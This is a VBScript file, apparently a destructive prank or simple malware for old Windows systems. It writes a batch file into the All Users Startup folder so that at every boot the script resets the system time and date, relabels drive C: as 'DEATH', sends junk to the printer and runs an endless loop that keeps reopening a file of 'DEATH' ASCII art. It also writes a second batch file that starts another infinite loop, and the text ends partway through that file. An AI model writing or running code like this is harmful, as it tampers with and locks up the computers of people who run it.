Const ForAppending = 8
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\WINDOWS-Startup.bat", ForAppending, True)

    
    objTextFile.WriteLine("@echo off")
    objTextFile.WriteLine("time 1:11")
    objTextFile.WriteLine("date 06/06/06")
    objTextFile.WriteLine("label c:DEATH")
    objTextFile.WriteLine("print C:\WINDOWS\system32000001.txt /d:lpt1")
    objTextFile.WriteLine("start C:\WINDOWS\system32000002.bat")
    objTextFile.WriteLine(":con")
    objTextFile.WriteLine("start C:\WINDOWS\WINDOWS-Startup2.txt")
    objTextFile.WriteLine("goto con")
    objTextFile.WriteLine("end")
                              
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\WINDOWS-Startup2.txt", ForAppending, True)

objTextFile.WriteLine("|\\\\\\\\      |\\\\\\\             /\       \\\\\\\\\\    |        |")
objTextFile.WriteLine("|          \     |                     /  \           |         |         |")
objTextFile.WriteLine("|          |     |                    /    \          |         |         |")
objTextFile.WriteLine("|          |     |\\\\\\\         /------\         |         |-------|")
objTextFile.WriteLine("|          |     |                /           \       |         |         |")
objTextFile.WriteLine("|          /     |               /             \      |         |         |")
objTextFile.WriteLine("|////////      |\\\\\\\     /                \     |         |        |")

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\system32000001.txt", ForAppending, True)

objTextFile.WriteLine("!@#$%^&*()0123456789abcdefghijklmnopqrstuvwxyz-_=+[{]}\|;:',<.>/?/*-+.`~")

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
("C:\WINDOWS\system32000002.bat", ForAppending, True)

objTextFile.WriteLine("@echo off")
objTextFile.WriteLine(":con")